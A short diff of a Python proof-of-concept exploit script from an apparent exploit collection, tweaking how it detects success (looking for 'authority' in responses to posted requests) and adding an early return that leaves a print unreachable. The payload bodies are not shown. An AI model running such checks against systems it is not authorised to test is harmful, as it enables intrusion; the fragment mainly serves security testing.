@@ -2,7 +2,7 @@
 # -*- coding:utf-8 -*-
 # author:MDSEC
 # from:https://github.com/MD-SEC/MDPOCS
-#  icon_hash="1578525679"
+# icon_hash="1578525679"
 
 import sys
 import requests
@@ -42,12 +42,13 @@ def exp(host):
     try:
         r1 =requests.post(vulurl1, headers=headers,data=str(raw1),timeout=15)
         r2 =requests.post(vulurl2, headers=headers,data=str(raw),timeout=15)
-        if  "system" in r1.text or "system" in r2.text:
+        if  "authority" in r1.text or "authority" in r2.text:
             if  "system" in r1.text:
                 print ("vulurl: "+vulurl1)
             else :
                 print ("vulurl: "+vulurl2)
         else :
+            return 0
             print (host+":false")
     except:
         print (host+"false")
